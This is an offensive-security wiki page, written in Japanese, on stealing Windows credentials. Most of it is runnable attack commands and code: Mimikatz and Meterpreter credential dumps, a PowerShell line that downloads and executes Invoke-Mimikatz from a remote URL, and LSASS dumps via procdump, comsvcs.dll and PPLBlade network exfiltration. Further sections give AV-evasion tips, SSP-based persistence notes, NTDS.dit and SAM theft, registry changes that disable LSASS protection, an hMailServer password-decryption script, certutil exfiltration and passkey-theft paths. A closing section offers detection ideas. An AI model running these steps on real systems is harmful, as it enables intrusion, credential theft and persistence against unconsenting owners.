# Windows Credentials の窃取

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatzでできるその他のことについては**[**こちらのページ**](credentials-mimikatz.md)**をご覧ください。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**ここでいくつかの認証情報保護について確認できます。**](credentials-protections.md) **これらの保護により、Mimikatzが一部の認証情報を抽出できなくなる可能性があります。**

## Meterpreterでの認証情報

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用して、被害者内部の** **パスワードとハッシュを検索します。**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV の Bypassing

### Procdump + Mimikatz

**Procdump from** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool** であるため、Defender に検出されません。\
この tool を使用して **lsass process を dump** し、**dump を download** して、dump から **credentials を locally extract** できます。

[SharpDump](https://github.com/GhostPack/SharpDump) も使用できます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) によって自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: 一部の **AV** は、**procdump.exe を使用して lsass.exe を dump** する行為を **malicious** として **detect** する場合があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を **detect** しているためです。そのため、procdump に **lsass.exe の名前** を渡す **代わりに**、lsass.exe の **PID** を **argument** として **渡す** 方が、より **stealthier** です。

### **comsvcs.dll** による lsass の Dump

`C:\Windows\System32` に存在する **comsvcs.dll** という名前の DLL は、クラッシュ発生時に **process memory を dump** する役割を担います。この DLL には **`MiniDumpW`** という名前の **function** が含まれており、`rundll32.exe` を使用して呼び出すよう設計されています。\
最初の 2 つの argument は使用しても意味がありませんが、3 つ目は 3 つの component に分かれています。dump 対象となる process ID が 1 つ目の component、dump file の location が 2 つ目、3 つ目は厳密に **full** という word である必要があります。代替 option は存在しません。\
これら 3 つの component が parsing されると、DLL は dump file の作成と、指定された process の memory のこの file への転送を開始します。\
**comsvcs.dll** を使用して lsass process を dump できるため、procdump を upload して execute する必要がなくなります。この method の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。<sup>[[9]](#references)</sup>

実行には次の command を使用します:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Managerを使用したlsassのDump**

1. Task Barを右クリックし、Task Managerをクリックします
2. More detailsをクリックします
3. Processesタブで「Local Security Authority Process」プロセスを検索します
4. 「Local Security Authority Process」プロセスを右クリックし、「Create dump file」をクリックします

### procdumpを使用したlsassのDump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suiteの一部であるMicrosoft signed binaryです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade による lsass のダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリダンプを難読化し、ディスクに保存することなくリモートワークステーションへ転送できる Protected Process Dumper Tool です。

**主な機能**:

1. PPL 保護のバイパス
2. Defender のシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
3. ディスクに保存することなく、RAW および SMB のアップロード方法でメモリダンプをアップロード（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump を使用しない SSP ベースの LSASS dumping

Ink Dragon には **LalsDumper** と呼ばれる 3 段階の dumper が含まれており、`MiniDumpWriteDump` を一度も呼び出さないため、この API に対する EDR hook は発火しません:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` 内から 32 個の小文字の `d` で構成された placeholder を検索し、それを `rtu.txt` への絶対パスで上書きします。パッチ済み DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより、悪意のある DLL が新しい Security Support Provider (SSP) として **LSASS** にロードされます。
2. **LSASS 内の Stage 2** – LSASS が `nfdp.dll` をロードすると、DLL は `rtu.txt` を読み込み、各 byte を `0x20` で XOR し、decode した blob をメモリに map してから実行を移します。
3. **Stage 3 dumper** – map された payload は、hash 化された API 名（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）から解決した **direct syscalls** を使用して、MiniDump のロジックを再実装します。`Tom` という専用 export は `%TEMP%\<pid>.ddt` を開き、圧縮された LSASS dump を file に stream し、handle を close するため、後から exfiltration を実行できます。

Operator notes:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt` は同じ directory に置いてください。Stage 1 は hard-coded placeholder を `rtu.txt` への絶対パスで書き換えるため、これらを分割すると chain が壊れます。
* Registration は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を append することで行われます。この value を自分で seed しておけば、毎回の boot 時に LSASS が SSP を reload するようにできます。
* `%TEMP%\*.ddt` files は圧縮された dump です。ローカルで decompress してから、credential extraction のために Mimikatz/Volatility に渡してください。
* `lals.exe` の実行には admin/SeTcb rights が必要です。これにより `AddSecurityPackageA` が成功します。この call が return すると、LSASS は rogue SSP を transparently load し、Stage 2 を実行します。
* DLL を disk から削除しても、LSASS から evict されることはありません。registry entry を削除して LSASS を restart（reboot）するか、long-term persistence のために残しておいてください。

## CrackMapExec

### SAM hash を dumpする
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets のダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### target DC から NTDS.dit を Dumpする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### target DC から NTDS.dit のパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM と SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ および _C:\windows\system32\config\SYSTEM_ に**存在するはずです**。ただし、**保護されている**ため、通常の方法で単純にコピーすることは**できません**。

### Registry から

これらのファイルを盗む最も簡単な方法は、Registry からコピーを取得することです。
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Kaliマシンにダウンロード**し、次のコマンドを使用して**ハッシュを抽出**します:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

このサービスを使用して保護されたファイルをコピーできます。Administrator 権限が必要です。

#### Using vssadmin

vssadmin バイナリは Windows Server バージョンでのみ利用できます
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、**Powershell**から同じことを実行できます。これは**SAMファイルをコピーする方法**の例です（使用するハードドライブは「C:」で、C:\users\Publicに保存されます）が、これを使用して保護されたファイルをコピーすることもできます。
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使用して、SAM、SYSTEM、ntds.ditのコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 認証情報 - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の中核として知られており、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースであり、**_%SystemRoom%/NTDS/ntds.dit_** にあります。

このデータベースでは、主に次の3つのテーブルが管理されています。

- **Data Table**: ユーザーやグループなどのオブジェクトに関する詳細を保存します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **Security descriptors** がここに保持され、保存されたオブジェクトのセキュリティとアクセス制御を保証します。

詳細については、こちらを参照してください: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows はこのファイルとやり取りするために _Ntdsa.dll_ を使用し、_lsass.exe_ によって使用されます。そのため、**NTDS.dit** ファイルの**一部**は **`lsass`** のメモリ内に存在する可能性があります（パフォーマンス向上のために **cache** が使用されるため、最近アクセスされたデータを取得できる可能性があります）。

#### NTDS.dit 内の hashes の Decrypting

hash は3回 cypher されます。

1. **BOOTKEY** と **RC4** を使用して Password Encryption Key (**PEK**) を Decrypt する。
2. **PEK** と **RC4** を使用して **hash** を Decrypt する。
3. **DES** を使用して **hash** を Decrypt する。

**PEK** は**すべての domain controller** で**同じ値**ですが、**domain controller の SYSTEM file の BOOTKEY（domain controller ごとに異なる）**を使用して **NTDS.dit** ファイル内で **cyphered** されています。そのため、NTDS.dit ファイルから credentials を取得するには、NTDS.dit と SYSTEM のファイル（_C:\Windows\System32\config\SYSTEM_）が必要です。

### Ntdsutil を使用した NTDS.dit の Copying

Windows Server 2008 以降で利用できます。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](#stealing-sam-and-system) の手法を使って **ntds.dit** ファイルをコピーすることもできます。なお、**SYSTEM file** のコピーも必要になります（同様に、[**registry から dump するか、volume shadow copy**](#stealing-sam-and-system) の手法を使用してください）。

### **NTDS.dit から hashes を抽出する**

**NTDS.dit** と **SYSTEM** ファイルを**取得**したら、_secretsdump.py_ などのツールを使用して **hashes を抽出**できます。
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効なドメイン管理者ユーザーを使用して、**自動的に抽出**することもできます：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**大きな NTDS.dit ファイル**の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使用して抽出することを推奨します。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` も使用できます。

### **NTDS.dit から SQLite データベースへの domain objects の抽出**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使用すると、NTDS objects を SQLite データベースに抽出できます。secrets だけでなく、raw NTDS.dit ファイルがすでに取得されている場合に、さらに情報を抽出できるよう、objects 全体とその attributes も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive は必須ではありませんが、secrets の復号（NT および LM hashes、cleartext passwords などの supplemental credentials、kerberos または trust keys、NT および LM password histories）を可能にします。その他の情報とともに、以下のデータが抽出されます：hashes 付きの user および machine accounts、UAC flags、最後の logon と password change の timestamp、accounts の description、names、UPN、SPN、groups と recursive memberships、organizational units の tree と membership、trusts の type、direction、attributes を含む trusted domains など。

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)から binary をダウンロードします。この binary を使用して、複数の software から credentials を抽出できます。
```
lazagne.exe all
```
## SAM と LSASS から認証情報を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールはメモリから認証情報を抽出するために使用できます。次の場所から Download してください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM ファイルから認証情報を抽出します
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM file から認証情報を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

[http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) から Download し、**execute** するだけで passwords が抽出されます。

## アイドル状態の RDP セッションの Mining と security controls の弱体化

Ink Dragon の FinalDraft RAT には、あらゆる red-teamer に役立つ手法を備えた `DumpRDPHistory` tasker が含まれています:<sup>[[3]](#references)</sup>

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` にあるすべての user hive を parse します。各 subkey には server name、`UsernameHint`、および最終 write timestamp が保存されています。PowerShell で FinalDraft の logic を再現できます:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log を query し、Event ID **21** (successful logon) と **25** (disconnect) を確認して、誰がその box を administer したかを特定します:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どの Domain Admin が定期的に接続しているか把握したら、その **disconnected** session がまだ存在している間に、LalsDumper/Mimikatz で LSASS を dump します。CredSSP + NTLM fallback により、その verifier と tokens が LSASS に残るため、それらを SMB/WinRM 経由で replay して `NTDS.dit` を取得したり、domain controllers に persistence を stage したりできます。

### FinalDraft が標的とする Registry downgrades

同じ implant は、credential theft を容易にするため、複数の registry keys も tamper します:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` を設定すると、RDP での完全な credential/ticket reuse が強制され、pass-the-hash 方式の pivot が可能になります。
* `LocalAccountTokenFilterPolicy=1` は UAC token filtering を無効化し、local admins がネットワーク経由で unrestricted tokens を取得できるようにします。
* `DSRMAdminLogonBehavior=2` により、DC がオンラインの状態でも DSRM administrator がログオンできるようになり、攻撃者に別の組み込み high-privilege account を与えます。
* `RunAsPPL=0` は LSASS PPL protections を削除し、LalsDumper などの dumpers による memory access を容易にします。

## hMailServer database credentials (post-compromise)

hMailServer は、DB password を `[Database] Password=` の下に `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` へ保存します。この値は、static key `THIS_KEY_IS_NOT_SECRET` と 4-byte word endianness swaps を使用して Blowfish-encrypted されています。INI の hex string を次の Python snippet で使用します:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
平文パスワードを使用して SQL CE database をコピーし、file locks を回避します。次に 32-bit provider をロードし、必要に応じて upgrade してから hashes を query します：
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` 列は hMailServer のハッシュ形式（hashcat モード `1421`）を使用します。これらの値を Cracking すると、WinRM/SSH pivots に再利用可能な認証情報を取得できます。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部の tooling は、LSA logon callback `LsaApLogonUserEx2` を intercept することで、**平文のログオンパスワード**を取得します。これは、認証パッケージの callback を hook または wrap し、認証情報を **ログオン中**（ハッシュ化前）に取得してから、ディスクに書き込むか operator に返すというものです。一般的には、LSA に inject または register する helper として実装され、成功した各 interactive/network logon event の username、domain、password を記録します。<sup>[[1]](#references)</sup>

Operational notes:
- 認証パスに helper をロードするには、local admin/SYSTEM が必要です。
- 取得された認証情報が表示されるのは、logon が発生した場合のみです（hook に応じて interactive、RDP、service、または network logon）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、保存された接続情報をユーザーごとの `sqlstudio.bin` ファイルに保存します。専用の dumper はこのファイルを parse して、保存された SQL credentials を復元できます。command output のみを返す shell では、ファイルを Base64 として encode し、stdout に出力することで exfiltrate することがよくあります。<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
オペレーター側でファイルを再構築し、dumperをローカルで実行して認証情報を復元します。
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Chrome on Windows からの Passkeys / WebAuthn 認証情報窃取

Windows ホスト上で **Chrome + Google Password Manager で同期された passkeys** を使用する **victim user** として code execution を取得できた場合、admin/SYSTEM 権限がなくても、passkeys は興味深い post-exploitation の標的になります。<sup>[[4]](#references)</sup>

### 興味深いローカルアーティファクト
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** には protobuf でエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されます。同一ユーザーのプロセスは、同期された passkey の **RP ID**、**username**、**credential ID**、および暗号化された秘密鍵の情報を列挙できます。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** や同期された credential の復元に使用されるラップ済み secret など、ローカルデバイスの enrollment 状態が保存されます。<sup>[[4]](#references)</sup>

簡易トリアージ:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs は依然としてローカル署名オラクルとして悪用可能

ブラウザが **`NCRYPT_OPAQUE_KEY_BLOB`** として TPM-backed identity key をエクスポートし、その blob をユーザーがアクセス可能な状態に保存している場合、malware は raw private key を抽出する必要がありません。単に **同じマシン**上で blob を再インポートし、ローカル TPM に attacker-controlled data への署名を要求できます:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
これは、**hardware bindingによりデバイス外へのexportは防止できるが、侵害されたendpoint上での同一ユーザーによる使用は防止できない**ことを意味します。

### Practical abuse paths

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- ChromeのLevelDBから`WebauthnCredentialSpecifics`を列挙する。
- passkey loginを開始し、新しいWebAuthn challengeを取得する。
- 盗み出した`wrapped_identity_private_key` blobを被害者のTPM上で使用し、cloud-authenticator request bindingに署名する。
- 返されたassertionをrelying partyにrelayする。
- これは、RPが`userVerification=preferred`を受け入れる場合や、**`UV=0`**のassertionを拒否しない場合に特に有効である。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state`を削除するか、正しく署名された`device/forget` operationを送信してre-onboardingを強制する。
- onboarding後にデバイスが**`uv_key_pending`**状態になった場合、攻撃者が管理するUV public keyを登録する。
- providerが新しいUV keyについてattestation / secure-hardware originを検証しない場合、後続の攻撃者keyによる署名は**`UV=1`**として扱われる。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- recoveryまたはrejoinを強制し、Chromeにsynced-passkey master secretを取得させる。
- `passkey_enclave_state`の再作成または変更を監視し、平文の**security domain secret (SDS)**がresidentである間にChrome memoryをdumpする。
- 回収したSDSを使用して、すべての`WebauthnCredentialSpecifics` record内のencrypted fieldsを復号し、portable WebAuthn private keysを回収する。

### DFIR / detection ideas

- **`passkey_enclave_state`の削除または再作成**を監視する。<sup>[[4]](#references)</sup>
- ブラウザ以外のprocessによるChrome **`Sync Data\LevelDB`**への異常なaccessをalertする。
- **Chrome memory dumps**や不審なcross-process memory accessをalertする。
- 繰り返し表示される**Google Password Manager recovery PIN** promptや、予期しないre-onboardingを調査する。
- WebAuthnの**`signCount`**はsynced passkeysでは一定のままになることがあるため、役に立たない場合が多い。したがって、従来のclone detectionは弱い。

## References

- [1] [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)

{{#include ../../banners/hacktricks-training.md}}
